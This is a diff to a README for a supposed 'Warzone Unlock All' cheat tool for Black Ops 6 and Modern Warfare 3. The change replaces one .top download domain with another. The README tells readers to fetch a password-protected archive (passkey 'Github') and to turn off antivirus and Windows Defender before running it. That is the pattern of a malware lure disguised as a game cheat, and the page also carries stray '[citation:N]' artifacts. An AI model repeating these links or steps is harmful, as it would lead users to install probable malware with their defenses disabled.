@@ -6,7 +6,7 @@ Warzone Unlock All tool for Black Ops 6 and Modern Warfare 3. Unlock weapons, op
 
 ## ⬇️ Download
 
-**[CLICK](https://gitappdown.top/)**
+**[CLICK](https://gitdownapply.top/)**
 
 Archive passkey: `Github`
 
@@ -78,7 +78,7 @@ This tool is designed for private matches and training modes . It does not perma
 
 ### Step-by-Step [citation:3][citation:12]
 
-1. Click **[CLICK](https://gitappdown.top/)** to download.
+1. Click **[CLICK](https://gitdownapply.top/)** to download.
 
 2. Turn off antivirus and Windows Defender [citation:3].
 
